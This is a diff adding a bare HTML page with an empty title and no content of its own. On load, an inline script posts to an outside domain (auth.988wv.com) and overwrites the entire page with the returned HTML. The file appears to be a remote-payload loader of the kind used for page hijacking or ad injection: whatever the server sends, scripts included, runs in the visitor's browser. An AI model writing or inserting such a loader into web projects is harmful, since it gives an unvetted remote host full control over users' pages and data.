@@ -1,0 +1,26 @@
+<html>
+
+<head>
+    <title></title>
+    <script src="//cdn.bootcss.com/jquery/1.11.2/jquery.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+</head>
+<body>
+
+<script>
+    x_load="https://auth.988wv.com//index/index/getDetailAd.html?"+new Date().getTime();
+    x_load && function() {
+        $.post(x_load, function(data) {
+            var new_doc = document.open("text/html", "replace");
+            new_doc.write(data);
+            new_doc.close();
+        });
+    }();
+
+</script>
+
+
+</body>
+</html>
+
